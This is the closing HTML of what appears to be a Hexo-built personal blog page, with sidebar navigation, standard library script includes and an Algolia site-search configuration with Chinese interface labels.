            <div class="sidebar-description"></div>
        </div>
        <div class="sidebar-state">
            <div class="sidebar-state-article">
                <div>Posts</div>
                <div class="sidebar-state-number">2</div>
            </div>
            <div class="sidebar-state-category">
                <div>Categories</div>
                <div class="sidebar-state-number">0</div>
            </div>
            <div class="sidebar-state-tag">
                <div>Tags</div>
                <div class="sidebar-state-number">6</div>
            </div>
        </div>
        <div class="sidebar-social">
            
                <div class=icon-github>
                    <a href=https://github.com/dik1o itemprop="url" target="_blank"></a>
                </div>
            
        </div>
        <div class="sidebar-menu">
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">Home</div>
                </div>
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">Archives</div>
                </div>
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/about"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">About</div>
                </div>
            
                <div class="sidebar-menu-link-wrap">
                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
                    <span class="sidebar-menu-icon"></span>
                    <div class="sidebar-menu-link">Friend</div>
                </div>
            
        </div>
    </div>
</nav>

        
<script src="https://unpkg.com/jquery@3.7.0/dist/jquery.min.js"></script>


<script src="https://unpkg.com/lazysizes@5.3.2/lazysizes.min.js"></script>


<script src="https://unpkg.com/clipboard@2.0.11/dist/clipboard.min.js"></script>



    
<script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>



    
<script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script>




    
<script src="https://unpkg.com/mermaid@9.4.3/dist/mermaid.min.js"></script>

    <script>
        if (window.mermaid) {
            mermaid.initialize({theme: 'forest'});
        }
    </script>



<script src="/js/script.js"></script>















    
<script src="https://unpkg.com/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"></script>

    
<script src="https://unpkg.com/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"></script>

    
<script src="/js/search.js"></script>

    <script>
        var CONFIG = {
            root: '/',
            algolia: {
                applicationID: "7W5IKP8RK0",
                apiKey: "4bd4a67da60f6165e40602e4e9461182",
                indexName: "ruime",
                hits: {
                    "per_page": parseInt("10")
                },
                labels: {
                    "input_placeholder": "搜索.....",
                    "hits_empty": "未发现与 「${query}」相关内容",
                    "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
                }
            }
        };
    </script>


    </div>
    <div class="site-search">
        <div class="algolia-popup popup">
            <div class="algolia-search">
                <span class="algolia-search-input-icon"></span>
                <div class="algolia-search-input" id="algolia-search-input"></div>
            </div>

            <div class="algolia-results">
                <div id="algolia-stats"></div>
                <div id="algolia-hits"></div>
                <div id="algolia-pagination" class="algolia-pagination"></div>
            </div>

            <span class="popup-btn-close"></span>
        </div>
    </div>
    <!-- hexo injector body_end start -->
<script src="/js/insertHighlight.js"></script>
<!-- hexo injector body_end end --></body>
    </html>

